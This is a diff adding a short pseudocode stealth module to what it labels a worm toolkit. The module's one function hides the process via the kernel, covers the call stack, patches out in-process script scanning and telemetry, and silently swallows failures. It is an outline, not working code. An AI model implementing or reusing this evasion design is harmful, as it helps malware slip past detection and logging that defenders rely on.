@@ -1,0 +1,18 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/stealth/mod.pseudo
+
+SUBMODULES: native_call, stack_cover, kernel_hide, inproc_patch
+
+FUNCTION bring_up() -> bool:
+    native_call.pick_path()
+    stack_cover.bring_up()
+    IF feature kernel_hide:
+        kernel_hide.hide(this_pid)
+    inproc_patch.patch_script_scan()
+    inproc_patch.patch_telemetry()
+    RETURN true    # always; failures inside are swallowed
